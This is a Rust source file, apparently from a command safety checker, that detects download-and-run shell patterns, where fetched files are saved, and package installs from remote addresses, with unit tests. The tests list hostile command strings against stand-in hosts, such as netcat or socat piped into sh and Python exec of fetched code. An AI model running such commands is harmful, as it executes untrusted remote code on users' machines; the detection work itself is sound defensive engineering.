//! Bringing code in from the network and running it, beyond `curl … | sh`:
//! other programs that fetch, other ways the fetched text reaches a shell,
//! where a fetch is saved, and package managers told to install from an
//! address.

use super::shell::{self, Command, program_name, unversioned};
use super::{FETCHERS, as_file, pipes_into_shell};

/// What marks an address rather than a file or a package name.
const ADDRESS_PREFIXES: &[&str] = &["http://", "https://", "ftp://", "git://", "ssh://"];

fn is_address(word: &str) -> bool {
    ADDRESS_PREFIXES
        .iter()
        .any(|prefix| word.starts_with(prefix))
}

/// Calls that read from an address in Python, as `python -c` is given them.
const PYTHON_FETCHES: &[&str] = &["urlopen(", "urlretrieve(", "requests.get(", "httpx.get("];

/// Whether `command` writes what it fetches to standard output, for the
/// fetchers beyond curl, wget and aria2c: httpie given an address, BSD
/// `fetch`, `lwp-request`, netcat and socat connected somewhere, and an
/// interpreter given a one-liner that requests an address.
fn fetches_otherwise(command: &Command, text: &str) -> bool {
    match unversioned(&command.program) {
        // `http` and `https` are also plain words: only with an address.
        "http" | "https" => command
            .operands()
            .any(|word| is_address(word) || word.contains('.') || word.starts_with("localhost")),
        "fetch" => command.operands().any(is_address),
        "lwp-request" => true,
        "nc" | "ncat" | "netcat" => command.operands().count() >= 2,
        "socat" => text.contains("tcp") || text.contains("ssl") || text.contains("udp"),
        "python" => command.has_short('c') && PYTHON_FETCHES.iter().any(|call| text.contains(call)),
        "perl" => command.has_short('e') && text.contains("lwp"),
        "ruby" => {
            command.has_short('e') && (text.contains("open-uri") || text.contains("net/http"))
        }
        _ => false,
    }
}

/// Whether one command fetches to standard output.
fn fetches(part: &str) -> bool {
    shell::pipes_from(part, &|command| {
        FETCHERS.contains(&command.program.as_str()) || fetches_otherwise(command, part)
    })
}

/// Whether any command in `text` fetches, including inside a `$(…)` or
/// `<(…)` substitution (`read -r x < <(curl …)`).
pub(super) fn text_fetches(text: &str) -> bool {
    if text.split(['|', ';', '&', '\n']).any(fetches) {
        return true;
    }
    let mut reading = shell::Reading::of(text);
    shell::substitutions(text)
        .iter()
        .any(|found| !reading.takes(found.body) || found.body.split(['|', ';', '&']).any(fetches))
}

/// The download-and-run shapes the plain pipe rule does not know: another
/// fetcher piped into an interpreter, a fetch run through a here-string or
/// a substitution, and Python running what it requests.
pub(super) fn matches(line: &str) -> bool {
    if ![
        "curl",
        "wget",
        "aria2c",
        "http",
        "fetch ",
        "lwp-",
        "nc ",
        "ncat ",
        "netcat ",
        "socat ",
        "urlopen(",
        "urlretrieve(",
        "requests.get(",
        "httpx.get(",
        "open-uri",
    ]
    .iter()
    .any(|word| line.contains(word))
    {
        return false;
    }
    let piped = line.contains('|')
        && pipes_into_shell(line, |part| {
            shell::pipes_from(part, &|command| fetches_otherwise(command, part))
        });
    piped
        || shell::runs_substitution(line, &text_fetches)
        || super::encoded::run_arguments(line)
            .any(|argument| PYTHON_FETCHES.iter().any(|call| argument.contains(call)))
}

/// The last part of an address's path: the name a fetch saves it under.
fn address_name(address: &str) -> Option<String> {
    let path = address.split(['?', '#']).next().unwrap_or_default();
    as_file(program_name(path.trim_end_matches(['/', ';'])))
}

/// The value of an option given as `--name value`, `--name=value` or, for
/// a short one, `-n value`.
fn option_value<'a>(command: &'a Command, names: &[&str]) -> Option<&'a str> {
    let mut words = command.arguments.iter();
    while let Some(word) = words.next() {
        if names.contains(&word.as_str()) {
            return words.next().map(String::as_str);
        }
        if let Some(value) = names.iter().find_map(|name| {
            word.strip_prefix(name)
                .and_then(|rest| rest.strip_prefix('='))
        }) {
            return Some(value);
        }
    }
    None
}

/// `dir/name`, or `name` alone in the directory a command runs in.
fn inside(directory: &str, name: &str) -> String {
    let directory = directory.trim_end_matches('/');
    if directory.is_empty() || directory == "." {
        name.to_string()
    } else {
        format!("{}/{name}", directory.trim_start_matches("./"))
    }
}

/// Where a copy from another machine lands: `scp host:a/x.sh .` gives
/// `x.sh`, `rsync host:x.sh bin/` gives `bin/x.sh`, and a destination
/// that may be a file or a directory gives both readings.
fn remote_copy(command: &Command) -> Vec<String> {
    let operands: Vec<&str> = command.operands().collect();
    let Some((destination, sources)) = operands.split_last() else {
        return Vec::new();
    };
    let is_remote = |word: &str| {
        word.split_once(':')
            .is_some_and(|(host, _)| !host.is_empty() && !host.contains('/'))
    };
    if is_remote(destination) {
        return Vec::new();
    }
    let mut found = Vec::new();
    for source in sources.iter().filter(|source| is_remote(source)) {
        let path = source.split_once(':').map_or("", |(_, path)| path);
        let Some(name) = as_file(program_name(path.trim_end_matches('/'))) else {
            continue;
        };
        found.push(inside(destination, &name));
        if *destination != "." && !destination.ends_with('/') {
            found.extend(as_file(destination));
        }
    }
    found
}

/// The file a fetcher other than curl, wget or aria2c saves: by its own
/// option, or under the name in the address.
fn saved_by(command: &Command) -> Vec<String> {
    let address = command.operands().find(|word| is_address(word));
    let named = |options: &[&str]| option_value(command, options).and_then(as_file);
    let one = |name: Option<String>| name.into_iter().collect();
    match command.program.as_str() {
        "scp" | "rsync" => remote_copy(command),
        "lwp-download" => {
            let mut operands = command.operands();
            let address = operands.next();
            one(operands
                .next()
                .and_then(as_file)
                .or_else(|| address.and_then(address_name)))
        }
        "fetch" => one(named(&["-o", "--output"]).or_else(|| address.and_then(address_name))),
        "http" | "https" => one(named(&["-o", "--output"])),
        // `tftp -g -r x host`, `tftp host -c get x`.
        "tftp" => one(named(&["-r", "-l", "get"])),
        // busybox: `ftpget host local remote`.
        "ftpget" => one(command.operands().nth(1).and_then(as_file)),
        _ => Vec::new(),
    }
}

/// Where curl, wget or aria2c put a download when told a directory: `wget
/// -P dir URL`, `curl --output-dir dir -O URL`, `aria2c -d dir URL`.
fn saved_in_directory(command: &Command) -> Option<String> {
    let options: &[&str] = match command.program.as_str() {
        "wget" => &["-P", "-p", "--directory-prefix"],
        "curl" => &["--output-dir"],
        "aria2c" => &["-d", "--dir"],
        _ => return None,
    };
    let directory = option_value(command, options)?;
    let name = option_value(command, &["-o", "--output", "--out"])
        .filter(|_| command.program != "wget")
        .and_then(as_file)
        .or_else(|| {
            command
                .operands()
                .find(|word| is_address(word))
                .and_then(address_name)
        })?;
    Some(inside(directory, &name))
}

/// The files a fetch on `line` is saved as beyond what `fetched_file`
/// names: through `tee`, into a directory, by a redirection of another
/// fetcher, or by a program that copies from another machine.
pub(super) fn saved_files(line: &str) -> Vec<String> {
    let mut found = Vec::new();
    for statement in shell::statements(line) {
        let parts = shell::pipeline(statement);
        for (at, part) in parts.iter().enumerate() {
            // `x=$(git clone … d) make`: the command in a substitution
            // that was looked past saves as well.
            for command in shell::inner_commands(part) {
                found.extend(saved_by(&command));
                found.extend(saved_in_directory(&command));
            }
            let Some(command) = shell::command(part) else {
                continue;
            };
            found.extend(saved_by(&command));
            found.extend(saved_in_directory(&command));
            if !fetches(part) {
                continue;
            }
            if !FETCHERS.contains(&command.program.as_str()) {
                found.extend(shell::written_file(part));
            }
            // `curl … | tee x`: saved on its way past.
            if let Some(next) = parts.get(at + 1).and_then(|next| shell::command(next))
                && next.program == "tee"
            {
                found.extend(next.operands().next().and_then(as_file));
            }
        }
    }
    found
}

/// Options of `pip install` that take a value which is not what is
/// installed (an index address is where packages are looked up, not one).
const PIP_VALUE_OPTIONS: &[&str] = &[
    "-i",
    "--index-url",
    "--extra-index-url",
    "-f",
    "--find-links",
    "--trusted-host",
    "--proxy",
    "-c",
    "--constraint",
    "--cert",
    "-t",
    "--target",
    "--prefix",
    "--root",
    "--python",
];

/// What follows the word `verb` among a command's arguments.
fn after<'a>(command: &'a Command, verbs: &[&str]) -> Option<&'a [String]> {
    command
        .arguments
        .iter()
        .position(|word| verbs.contains(&word.as_str()))
        .map(|at| &command.arguments[at + 1..])
}

/// `pip install` given an address or a repository instead of a name, or a
/// requirements list that is fetched.
fn pip_installs_address(command: &Command, fed_by_fetch: bool) -> bool {
    let pip = match unversioned(&command.program) {
        "pip" | "pipx" | "uv" => true,
        "python" => command.arguments.iter().any(|word| word == "pip"),
        _ => false,
    };
    let Some(rest) = after(command, &["install"]).filter(|_| pip) else {
        return false;
    };
    let mut words = rest.iter().map(String::as_str);
    while let Some(word) = words.next() {
        if PIP_VALUE_OPTIONS.contains(&word) {
            words.next();
        } else if matches!(word, "-r" | "--requirement") {
            let list = words.next().unwrap_or_default();
            if is_address(list) || (fed_by_fetch && matches!(list, "/dev/stdin" | "-")) {
                return true;
            }
        } else if !word.starts_with('-')
            && (is_address(word)
                || ["git+", "hg+", "svn+", "bzr+"]
                    .iter()
                    .any(|scheme| word.contains(scheme))
                || word.contains("@ http")
                || word.contains("@http"))
        {
            return true;
        }
    }
    false
}

/// A package named by where it is fetched from rather than by a registry
/// name: an address, or a repository shorthand.
fn is_remote_package(word: &str) -> bool {
    is_address(word)
        || ["git+", "github:", "gitlab:", "bitbucket:", "gist:"]
            .iter()
            .any(|prefix| word.starts_with(prefix))
}

/// Whether a package is named without a version that fixes what is run:
/// `pkg`, `pkg@latest`, but not `pkg@1.2.3` or `@scope/pkg@1.2.3`.
fn is_unpinned(word: &str) -> bool {
    match word.get(1..).and_then(|rest| rest.rsplit_once('@')) {
        Some((_, version)) => matches!(version, "latest" | "next" | "canary" | ""),
        None => true,
    }
}

/// npm and its relatives installing from an address, or running a package
/// fetched for the occasion: `npx --yes pkg`, `pnpm dlx pkg`.
fn node_installs_address(command: &Command) -> bool {
    let program = command.program.as_str();
    if matches!(program, "npm" | "pnpm" | "yarn" | "bun")
        && after(command, &["install", "i", "add"])
            .is_some_and(|rest| rest.iter().any(|word| is_remote_package(word)))
    {
        return true;
    }
    // What is run straight after being fetched.
    let (run, always) = match program {
        "npx" | "bunx" => (Some(&command.arguments[..]), program == "bunx"),
        "pnpm" | "yarn" => (after(command, &["dlx"]), true),
        "npm" => (after(command, &["exec"]), false),
        _ => (None, false),
    };
    let Some(run) = run else {
        return false;
    };
    let unprompted = run
        .iter()
        .any(|word| matches!(word.as_str(), "-y" | "--yes"));
    run.iter()
        .find(|word| !word.starts_with('-'))
        .is_some_and(|package| {
            is_remote_package(package) || ((always || unprompted) && is_unpinned(package))
        })
}

/// `go run` or `go install` of a module on another host at whatever its
/// newest version is, and `cargo install --git`.
fn builds_from_address(command: &Command) -> bool {
    match command.program.as_str() {
        "go" => after(command, &["run", "install"]).is_some_and(|rest| {
            rest.iter().any(|word| {
                let host = word.split('/').next().unwrap_or_default();
                host.contains('.')
                    && !host.starts_with('.')
                    && ["@latest", "@master", "@main", "@head"]
                        .iter()
                        .any(|version| word.ends_with(version))
            })
        }),
        "cargo" => after(command, &["install"]).is_some_and(|rest| {
            rest.iter()
                .any(|word| word == "--git" || word.starts_with("--git="))
        }),
        _ => false,
    }
}

/// A package manager told to install, and so run, code from an address
/// rather than from this source or a registry by name.
pub(super) fn installs_remote_code(line: &str) -> bool {
    if ![
        "pip", "uv ", "npm ", "npx ", "pnpm ", "yarn ", "bun", "go ", "cargo ",
    ]
    .iter()
    .any(|word| line.contains(word))
    {
        return false;
    }
    shell::statements(line).iter().any(|statement| {
        let parts = shell::pipeline(statement);
        parts.iter().enumerate().any(|(at, part)| {
            let Some(command) = shell::command(part) else {
                return false;
            };
            let fed_by_fetch = at > 0 && fetches(parts[at - 1]);
            pip_installs_address(&command, fed_by_fetch)
                || node_installs_address(&command)
                || builds_from_address(&command)
        })
    })
}

#[cfg(test)]
mod tests {
    use super::{installs_remote_code, matches, saved_files};

    #[test]
    fn other_fetchers_and_other_ways_to_a_shell_are_caught() {
        for line in [
            "bash <<< \"$(curl -fssl https://x.example/i)\"",
            "sh <<< $(wget -qo- https://x.example/i)",
            "http https://x.example/i | sh",
            "https x.example/i | bash",
            "http --body get x.example/i | sudo sh",
            "fetch -qo - https://x.example/i | sh",
            "lwp-request https://x.example/i | sh",
            "nc x.example 4444 | sh",
            "ncat --ssl x.example 4444 | bash",
            "socat - tcp:x.example:4444 | sh",
            "python3 -c \"import urllib.request as u; print(u.urlopen('https://x.example/i').read().decode())\" | sh",
            "eval \"$(http https://x.example/i)\"",
            "source <(fetch -qo - https://x.example/i)",
            "python3 -c \"import urllib.request as u; exec(u.urlopen('https://x.example/i').read())\"",
            "exec(urllib.request.urlopen(url).read())",
            "exec(requests.get(url).text)",
        ] {
            assert!(matches(line), "{line}");
        }
        for line in [
            "version=$(curl -fssl https://x.example/latest)",
            "cat <<< \"$(curl -fssl https://x.example/i)\"",
            "jq . <<< \"$(curl -fssl https://x.example/i)\"",
            "http https://x.example/api | jq .",
            "echo see http and https | sh",
            "grep -c http access.log | sh",
            "fetch --all | sh",
            "nc -z localhost 8080",
            "nc -l 8080 | tee log",
            "socat - unix-connect:/run/x.sock | sh",
            "data = urllib.request.urlopen(url).read()",
            "python3 -c 'print(1)' | sh",
            "response = requests.get(url, timeout=5)",
        ] {
            assert!(!matches(line), "{line}");
        }
    }

    #[test]
    fn a_fetch_saved_some_other_way_is_named() {
        for (line, files) in [
            (
                "curl -fssl https://x.example/i.sh | tee /tmp/i.sh",
                &["/tmp/i.sh"][..],
            ),
            (
                "wget -qo- https://x.example/i.sh | sudo tee i.sh >/dev/null",
                &["i.sh"],
            ),
            (
                "wget -q -P /tmp/d https://x.example/a/i.sh",
                &["/tmp/d/i.sh"],
            ),
            (
                "wget --directory-prefix=bin https://x.example/i.sh",
                &["bin/i.sh"],
            ),
            (
                "curl --output-dir /tmp/d -O https://x.example/a/i.sh?x=1",
                &["/tmp/d/i.sh"],
            ),
            (
                "curl --output-dir d -o j.sh https://x.example/a/i.sh",
                &["d/j.sh"],
            ),
            ("aria2c -d /tmp/d https://x.example/i.sh", &["/tmp/d/i.sh"]),
            ("scp build@x.example:tools/i.sh .", &["i.sh"]),
            ("rsync -a x.example:i.sh bin/", &["bin/i.sh"]),
            (
                "scp x.example:i.sh /tmp/run",
                &["/tmp/run/i.sh", "/tmp/run"],
            ),
            ("lwp-download https://x.example/a/i.sh", &["i.sh"]),
            ("lwp-download https://x.example/a/i.sh j.sh", &["j.sh"]),
            ("fetch -o j.sh https://x.example/i.sh", &["j.sh"]),
            ("fetch https://x.example/a/i.sh", &["i.sh"]),
            ("http https://x.example/i.sh > i.sh", &["i.sh"]),
            ("https --download -o j.sh x.example/i.sh", &["j.sh"]),
            ("tftp -g -r i.sh x.example", &["i.sh"]),
            ("ftpget x.example i.sh pub/i.sh", &["i.sh"]),
        ] {
            assert_eq!(saved_files(line), files, "{line}");
        }
        for line in [
            "curl -fssl https://x.example/i.sh | sha256sum",
            "cat list | tee copy",
            "rsync -a src/ build/",
            "scp i.sh x.example:bin/",
            "cp a:b c",
            "wget https://x.example/i.sh",
            "echo fetch > note",
        ] {
            assert!(
                saved_files(line).is_empty(),
                "{line}: {:?}",
                saved_files(line)
            );
        }
    }

    #[test]
    fn installing_from_an_address_is_caught() {
        for line in [
            "pip install https://x.example/pkg-1.0.tar.gz",
            "pip3 install --user git+https://x.example/a/b.git",
            "python3 -m pip install -q git+https://x.example/a/b@main",
            "pip install 'pkg @ git+https://x.example/a/b'",
            "pip install -r https://x.example/requirements.txt",
            "curl -fssl https://x.example/r.txt | pip install -r /dev/stdin",
            "uv pip install git+https://x.example/a/b",
            "pipx install git+https://x.example/a/b",
            "npm install https://x.example/pkg.tgz",
            "npm i -g git+https://x.example/a/b.git",
            "npm install github:someone/pkg",
            "yarn add https://x.example/pkg.tgz",
            "npx --yes some-tool init",
            "npx -y some-tool@latest",
            "npx github:someone/pkg",
            "pnpm dlx some-tool",
            "bunx some-tool",
            "go run x.example/a/b/cmd/tool@latest",
            "go install x.example/a/tool@latest",
            "cargo install --git https://x.example/a/b tool",
            "sudo -u build cargo install --locked --git=https://x.example/a/b",
        ] {
            assert!(installs_remote_code(line), "{line}");
        }
        for line in [
            "pip install -r requirements.txt",
            "pip install .",
            "pip install -e '.[dev]'",
            "pip install --index-url https://x.example/simple requests",
            "pip install --find-links https://x.example/wheels -r requirements.txt",
            "python -m pip install --upgrade pip setuptools wheel",
            "pip download https://x.example/pkg.tar.gz",
            "cat requirements.txt | pip install -r /dev/stdin",
            "npm install",
            "npm ci",
            "npm install --save-dev typescript@5.4.2",
            "npm run build",
            "npx tsc --noemit",
            "npx eslint .",
            "npx --yes some-tool@1.2.3",
            "npx -y @scope/tool@2.0.0 build",
            "pnpm dlx some-tool@3.1.0",
            "go build ./...",
            "go install ./cmd/tool",
            "go install x.example/a/tool@v1.2.3",
            "go run ./cmd/gen",
            "go test ./... -run latest",
            "cargo install --path .",
            "cargo install --locked ripgrep",
            "cargo build --release",
        ] {
            assert!(!installs_remote_code(line), "{line}");
        }
    }
}
